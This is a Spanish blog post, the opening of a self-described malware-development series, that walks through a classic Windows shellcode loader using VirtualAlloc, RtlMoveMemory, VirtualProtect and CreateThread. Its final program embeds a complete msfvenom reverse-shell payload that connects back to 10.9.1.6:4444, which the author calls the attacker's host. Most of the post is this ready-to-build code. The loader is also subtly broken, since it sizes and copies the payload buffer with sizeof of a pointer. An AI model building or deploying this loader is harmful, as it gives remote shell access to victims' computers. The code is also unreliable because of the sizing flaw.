---
title: Classic Process Injection en Windows
author: thespartoos
date: 2023-11-7 00:34:00 +0800
tags: [Malware Development]
categories: [Malware Development]
image:
  path: https://thespartoos.github.io/assets/img/favicons/ProcessInjection/portada.png
  alt: 
---

### Introducción

En este artículo comienza una serie de malware development como de AV/EDR evasion. Todo será organizado correctamente e intentaré explicarlo de la mejor manera posible.

> No soy un experto en el tema simplemente intento explicar los conocimientos que he estado adquiriendo para poder seguir llegando a más gente y que pueda entenderlo mejor y que esté más accesible.

### ¿Qué es Process Injection?

La técnica de inyección de código es un método **simple** cuando un proceso inyecta código, en este caso (shellcode), en otro proceso en ejecución.

Los pasos generales para la inyección de shellcode son los siguientes:

1. Controlar un proceso o crear un proceso.
2. Asignar el buffer en memoria suficiente y con los permisos adecuados.
3. Escribir en el buffer de memoria del proceso anteriormente creado el shellcode.
4. Crear un hilo que ejecutará lo que has asignado y escrito en el proceso.
5. Esperar a que finaliza el hilo.

En este artículo se estará utilizando la [API Win32]() para realizar el shellcode injection, lo cual deberías estar un poco familiarizado. En todo caso cada línea de codigo será explicada tanto como pueda.

### Creando el programa

En mi caso voy a estar empleando Microsoft Visual Studio 2022, programando en el&nbsp;`lenguaje de C/C++`&nbsp;. Pongo los dos mensajes debido a que crearé archivos en .cpp pero la mayor parte del código estará en C estandar.

```c
#include <windows.h> # Importa funciones para procesos
#include <stdio.h> # Entrada y salida de datos
#include <stdlib.h> # manejar memoria dinámica
#include <string.h> # Trabajar con cadena de caracteres
```

Esta es la primera parte del código en donde definimos los encabezados los cuales nos darán acceso a numerosas funciones.

Para nosotros poder asignar memoria en un proceso o incluso en el de nuestra propio programa utilizaremos la función de &nbsp;VirtualAlloc&nbsp;.

```c++
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

Esta función cuenta con 4 parametros que requiere la función, el primero es opcional, por lo tanto en algunos casos si no deseas ponerlo pones 0.

LPVOID lpAddress -> Indica la dirección inicial de la región que se va a asignar.
SIZE_T dwSize --> Tamaño de la región, en bytes. Si el parámetro lpAddress es NULL, este valor se redondea al límite de la página siguiente.
DWORD  flAllocationType --> Tipo de asignación de memoria (MEM_COMMIT | MEM_RESERVE).
DWORD  flProtect --> Protección de memoria para la región de las páginas que se van a asignar.

Lo siguiente será escribir el contenido de nuestro payload en el buffer que asignamos en el paso anterior.

```c++
VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
);
```

Esta función cuenta con 3 parametros que requiere la función, el primero es de salida

https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory

`VOID UNALIGNED *Destination` --> Un puntero al bloque de memoria de destino al que copiar los bytes.<br>
`VOID UNALIGNED *Source` --> Un puntero al bloque de memoria de origen del que copiar los bytes.<br>
`SIZE_T Length` --> El número de bytes a copiar del origen al destino.<br>

A su vez tendremos que cambiar los permisos del bloque de memoria a PAGE_EXECUTE_READ, para que una vez copiado el payload en ese bloque de la memoria pueda posteriormente ser ejecutado.

```c++
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

https://learn.microsoft.com/es-es/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

LPVOID lpAddress --> Dirección de la página inicial de la región de páginas cuyos atributos de protección de acceso se van a cambiar.
SIZE_T dwSize --> Tamaño de la región cuyos atributos de protección de acceso se van a cambiar, en bytes.
DWORD  flNewProtect --> La opción de protección de memoria.
PDWORD lpflOldProtect --> Puntero a una variable que recibe el valor de protección de acceso anterior de la primera página de la región especificada de páginas.

Por último necesitamos crear un hilo que ejecute nuestro payload alojado en el buffer de la memoria que asignamos y rellenamos.

```c++
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

https://learn.microsoft.com/es-es/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

LPSECURITY_ATTRIBUTES lpThreadAttributes --> Un puntero que determina si el mango devuelto puede ser heredado por procesos infantiles. Null es que no lo puede heredar
SIZE_T dwStackSize --> El tamaño inicial de la pila, en bytes.
LPTHREAD_START_ROUTINE lpStartAddress --> Un puntero a la función definida por la aplicación a ejecutar por el hilo.
LPVOID lpParameter --> Un puntero a una variable a pasar al hilo.
DWORD dwCreationFlags --> Las banderas que controlan la creación del hilo.
LPDWORD lpThreadId --> Un puntero a una variable que recibe el identificador de hilo. Si este parámetro es NULL, el identificador de hilo no se devuelta.

Por último necesitamos esperar a que finalice el hilo que creamos.

```c++
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
);
```

https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

HANDLE hHandle --> El handle al objeto
DWORD  dwMilliseconds --> El intervalo de tiempo de salida, en milisegundos.

En la siguiente parte del codigo se utilizan las funciones necesarias para poder ejecutar el shellcode injection correctamente.

```c
int main() {
  void * myPayloadMem; // memory buffer for payload
  BOOL rv; // result VirtualProtect
  HANDLE th; // thread handle
  DWORD oldprotect = 0; // oldprotect value

  // Alojar un espacio de memoria para el payload
  myPayloadMem = VirtualAlloc(0, sizeof(myPayloadMem), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copiamos el payload al buffer asignado
  RtlMoveMemory(myPayloadMem, my_payload, sizeof(myPayloadMem));

  // Hacemos ejecutable el buffer de memoria
  rv = VirtualProtect(myPayloadMem, sizeof(myPayloadMem), PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // Ejecutamos el payload
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) myPayloadMem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

Ahora necesitamos generar nuestro shellcode, que será el código que posteriormente será ejecutado.

Codigo Final.


```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// our payload: reverse shell (msfvenom)
unsigned char my_payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
"\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x0a\x09\x01\x06\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
"\x48\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";

int main() {
  void * myPayloadMem; // memory buffer for payload
  BOOL rv; // result VirtualProtect
  HANDLE th; // thread handle
  DWORD oldprotect = 0; // oldprotect value

  // Alojar un espacio de memoria para el payload
  myPayloadMem = VirtualAlloc(0, sizeof(myPayloadMem), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  // Copiamos el payload al buffer asignado
  RtlMoveMemory(myPayloadMem, my_payload, sizeof(myPayloadMem));

  // Hacemos ejecutable el buffer de memoria
  rv = VirtualProtect(myPayloadMem, sizeof(myPayloadMem), PAGE_EXECUTE_READ, &oldprotect);
  if ( rv != 0 ) {

    // Ejecutamos el payload
    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) myPayloadMem, 0, 0, 0);
    WaitForSingleObject(th, -1);
  }
  return 0;
}
```

Al ejecutar como vemos se nos ejecuta el shellcode.

### Analizamos el Funcionamiento

Para investigar nuestro exe, usaremos Process Hacker. Process Hacker es una herramienta de código abierto que le permitirá ver qué procesos se están ejecutando en un dispositivo, identificar programas que están consumiendo recursos de la CPU e identificar conexiones de red asociadas con un proceso en otro tipos de opciones que iremos descubriendo poco a poco en los posts.

Una vez ejecutado el binario. Luego en la pestaña de Network veremos que nuestro proceso establece conexión con 10.9.1.6:4444(host del atacante).


### Conclusión

Este post no trata de evadir el AV/EDR, trata sobre malware development en los siguientes post estaré hablando de diferentes formas de ejecutar código a través otros métodos.





